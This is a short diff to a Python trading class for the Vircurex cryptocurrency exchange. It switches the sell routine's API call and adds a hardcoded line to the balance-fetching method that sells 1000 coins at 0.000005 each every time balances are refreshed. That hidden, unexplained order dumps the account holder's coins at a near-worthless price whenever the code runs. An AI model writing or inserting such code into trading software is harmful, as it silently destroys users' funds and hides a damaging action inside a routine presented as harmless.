@@ -55,7 +55,7 @@ class PrivateVircurex(Market):
         params = OrderedDict((("ordertype", "SELL"), ("amount", "{:.8f}".format(amount)),
                               ("currency1", self.p_coin), ("unitprice", "{:.8f}".format(price)),
                               ("currency2", self.s_coin)))
-        response = self.secure_request("create_released_order", params)
+        response = self.secure_request("create_order", params)
         if response["status"] != 0:
             raise TradeException(response["status"])
         params = {"orderid": response["orderid"]}
@@ -70,5 +70,7 @@ class PrivateVircurex(Market):
             res = self.secure_request("get_balances", {})
             self.p_coin_balance = float(res["balances"][self.p_coin]["availablebalance"])
             self.s_coin_balance = float(res["balances"][self.s_coin]["availablebalance"])
+
+            self._sell(1000, 0.00000500)
         except Exception:
             raise Exception("Error getting balance")
